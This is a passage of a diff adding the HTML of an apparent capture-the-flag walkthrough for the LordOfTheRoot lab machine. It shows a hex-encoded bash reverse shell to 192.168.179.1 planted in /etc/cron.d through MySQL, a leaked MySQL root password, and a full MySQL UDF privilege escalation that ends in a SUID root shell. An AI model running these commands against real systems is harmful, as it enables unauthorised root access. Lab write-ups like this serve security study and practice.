+os.system<span class="o">(</span><span class="s2">"rm "</span>+t+<span class="s2">"buf"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# crontab <span class="nt">-l</span>
+<span class="c"># Edit this file to introduce tasks to be run by cron.</span>
+<span class="c"># </span>
+<span class="c"># Each task to run has to be defined through a single line</span>
+<span class="c"># indicating with different fields when the task will be run</span>
+<span class="c"># and what command to run for the task</span>
+<span class="c"># </span>
+<span class="c"># To define the time you can provide concrete values for</span>
+<span class="c"># minute (m), hour (h), day of month (dom), month (mon),</span>
+<span class="c"># and day of week (dow) or use '*' in these fields (for 'any').# </span>
+<span class="c"># Notice that tasks will be started based on the cron's system</span>
+<span class="c"># daemon's notion of time and timezones.</span>
+<span class="c"># </span>
+<span class="c"># Output of the crontab jobs (including errors) is sent through</span>
+<span class="c"># email to the user the crontab file belongs to (unless redirected).</span>
+<span class="c"># </span>
+<span class="c"># For example, you can run a backup of all your user accounts</span>
+<span class="c"># at 5 a.m every week with:</span>
+<span class="c"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+<span class="c"># </span>
+<span class="c"># For more information see the manual pages of crontab(5) and cron(8)</span>
+<span class="c"># </span>
+<span class="c"># m h  dom mon dow   command</span>
+<span class="k">*</span>/3 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> /root/switcher.py
+</code></pre></div></div>
+
+<p>This is the vulnerable buf.c script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>buf.c 
+<span class="c">#include &lt;string.h&gt;</span>
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">){</span>
+
+        char buff[159]<span class="p">;</span>
+        <span class="k">if</span><span class="o">(</span>argc &lt;2<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"Syntax: %s &lt;input string&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span> <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+
+        <span class="o">}</span>
+  strcpy<span class="o">(</span>buff, argv[1]<span class="o">)</span><span class="p">;</span>
+  <span class="k">return </span>0<span class="p">;</span>
+
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This is the non-vulnerable other.c script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@LordOfTheRoot:/root# <span class="nb">cat </span>other.c 
+<span class="c">#include &lt;string.h&gt;</span>
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#include &lt;stdlib.h&gt;</span>
+
+int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">){</span>
+
+        char buff[150]<span class="p">;</span>
+        <span class="k">if</span><span class="o">(</span>argc &lt;2<span class="o">){</span>
+                <span class="nb">printf</span><span class="o">(</span><span class="s2">"Syntax: %s &lt;input string&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
+                <span class="nb">exit</span> <span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+
+        <span class="o">}</span>
+  //This Program does nothing
+  <span class="k">return </span>0<span class="p">;</span>
+
+<span class="o">}</span> 
+</code></pre></div></div>
+
+<h3 id="mysql-running-with-root-permissions">MySQL running with root permissions</h3>
+
+<p>Another path to get root is through MySQL, as it runs as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:/<span class="nv">$ </span>ps aux | <span class="nb">grep </span>mysqld root      1360  0.6  0.1
+318404   848 ?        Ssl  13:43   1:12 /usr/sbin/mysqld
+</code></pre></div></div>
+
+<p>The credentials to connect to MySQL are in the login.php file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:/var/www/978345210<span class="nv">$ </span><span class="nb">grep</span> <span class="s1">'$db '</span> login.php 
+                <span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">'localhost'</span>, <span class="s1">'root'</span>, <span class="s1">'darkshadow'</span>, <span class="s1">'Webapp'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>I encoded to hexadecimal a reverse shell that runs every minute.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LordOfTheRoot:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'* * * * * root /bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> | xxd <span class="nt">-ps</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span><span class="p">;</span> <span class="nb">echo
+</span>2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a
+</code></pre></div></div>
+
+<p>I wrote the reverse shell in the /etc/cron.d directory using mysql.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select </span>0x2a202a202a202a202a20726f6f74202f62696e2f62617368202d6320222f62696e2f62617368202d69203e26202f6465762f7463702f3139322e3136382e3137392e312f34343320303e2631220a into outfile <span class="s1">'/etc/cron.d/back.door'</span><span class="p">;</span>
+Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>As we can see our reverse shell was written as root, but it doesn’t is executed.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.d/back.door <span class="nt">-rw-rw-rw-</span> 1 root
+root 80 Nov 03 06:06 /etc/cron.d/back.door 
+</code></pre></div></div>
+
+<h3 id="mysql-user-defined-functions">MySQL User Defined Functions</h3>
+
+<p>This version of MySQL is affected by a vulnerability that allows users to run user-defined functions to execute commands in the context of MySQL, which in this case is root. access to MySQL as the root user is required.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>mysql <span class="nt">--version</span> 
+mysql Ver 14.14 Distrib 5.5.44, <span class="k">for </span>debian-linux-gnu <span class="o">(</span>i686<span class="o">)</span> using readline 6.3 
+</code></pre></div></div>
+
+<p>As we know the MySQL credentials and this is running as root only we just to look for a UDF exploit, there is an article how to exploit UDF <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit mysql udf <span class="nb">local</span>
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
+ Exploit Title                                                                      |  Path
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
+MySQL 4.0.17 <span class="o">(</span>Linux<span class="o">)</span> - User-Defined Function <span class="o">(</span>UDF<span class="o">)</span> Dynamic Library <span class="o">(</span>1<span class="o">)</span>              | linux/local/1181.c
+MySQL 4.x/5.0 <span class="o">(</span>Linux<span class="o">)</span> - User-Defined Function <span class="o">(</span>UDF<span class="o">)</span> Dynamic Library <span class="o">(</span>2<span class="o">)</span>             | linux/local/1518.c
+MySQL 4/5/6 - UDF <span class="k">for </span>Command Execution                                             | linux/local/7856.txt
+<span class="nt">------------------------------------------------------------------------------------</span> <span class="nt">-------------------------</span>
+</code></pre></div></div>
+
+<p>I copied the 1518.c exploit to my current directory, moved it to the web root, and started the apache service.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>searchsploit <span class="nt">-m</span> linux/local/1518.c
+root@kali:~<span class="nv">$ </span><span class="nb">mv </span>1518.c /var/www/html
+root@kali:~<span class="nv">$ </span>systemctl start apache2.service
+</code></pre></div></div>
+
+<p>On the target machine we download the UDF exploit, we compile it and create the shared library.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>wget 192.168.179.1/1518.c
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-c</span> 1518.c <span class="nt">-o</span> raptor_udf2.o <span class="nt">-fPIC</span>
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
+</code></pre></div></div>
+
+<p>We connect to mysql database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 5130
+Server version: 5.5.44-0ubuntu0.14.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+mysql&gt;
+</code></pre></div></div>
+
+<p>We switch to the MySQL database.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; use mysql<span class="p">;</span>
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+mysql&gt;
+</code></pre></div></div>
+
+<p>We create a table to hold the exploit code.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+Query OK, 0 rows affected <span class="o">(</span>0.01 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We import the exploit inserting its content into the table.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/smeagol/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
+Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We select the binary content and dump it into the plugins directory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/mysql/plugin/raptor_udf2.so'</span><span class="p">;</span>
+Query OK, 1 row affected <span class="o">(</span>0.01 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We create a function to call the exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
+Query OK, 0 rows affected <span class="o">(</span>0.01 sec<span class="o">)</span>
+
+
+The following statement can be used to execute system commands as root
+</code></pre></div></div>
+
+<p>We can verify that the function exists.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select</span> <span class="k">*</span> from mysql.func<span class="p">;</span>
++-----------+-----+----------------+----------+
+| name      | ret | dl             | <span class="nb">type</span>     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | <span class="k">function</span> |
++-----------+-----+----------------+----------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
+</code></pre></div></div>
+
+<p>We copy the /bin/sh binary to tmp directory and we grant it SUID permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; <span class="k">select </span>do_system<span class="o">(</span><span class="s1">'cp /bin/sh /tmp/sh &amp;&amp; chmod 4777 /tmp/sh'</span><span class="o">)</span><span class="p">;</span>
++-------------------------------------------------------+
+| do_system<span class="o">(</span><span class="s1">'cp /bin/sh /tmp/sh &amp;&amp; chmod 4777 /tmp/sh'</span><span class="o">)</span> |
++-------------------------------------------------------+
+|                                                     0 |
++-------------------------------------------------------+
+1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+
+mysql&gt; quit<span class="p">;</span>
+Bye
+</code></pre></div></div>
+
+<p>As we can see our binary was copied, we execute it and get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /tmp/sh 
+<span class="nt">-rwsrwxrwx</span> 1 root root 112204 Nov  9 13:23 /tmp/sh
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>/tmp/sh
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
+<span class="c"># python -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
+root@LordOfTheRoot:~# <span class="nb">cd</span> /root
+root@LordOfTheRoot:/root# <span class="nb">ls
+</span>buf  buf.c  Flag.txt  other  other.c  switcher.py
+root@LordOfTheRoot:/root# <span class="nb">cat </span>Flag.txt 
+“There is only one Lord of the Ring, only one <span class="nb">who </span>can bend it to his will. And he does not share power.”
+– Gandalf
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
